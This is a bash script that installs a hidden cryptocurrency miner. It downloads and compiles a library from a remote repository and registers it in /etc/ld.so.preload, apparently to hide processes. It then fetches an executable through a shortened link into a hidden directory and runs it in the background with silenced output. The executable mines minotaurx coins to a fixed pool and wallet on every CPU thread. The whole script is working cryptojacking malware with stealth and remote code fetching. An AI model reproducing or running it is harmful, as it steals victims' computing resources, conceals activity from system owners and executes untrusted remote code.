#!/bin/bash
apt-get update ; apt-get install sudo wget cpulimit -y
curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
mkdir .lib && cd .lib
wget -O sgr1 https://bitly.ws/38oka >/dev/null 2>&1
chmod +x sgr1
cpulimit -l 600 -e sgr1 &
sudo sync && sudo echo 3 > /proc/sys/vm/drop_caches
nice -n -10 nohup ./sgr1 --algorithm minotaurx --pool stratum-na.rplant.xyz:7068 --wallet RBPnYFfFtBr8HxTsq2bZ6wxQv6BzbmaUHH.envio --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive  > /dev/null 2>&1 &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
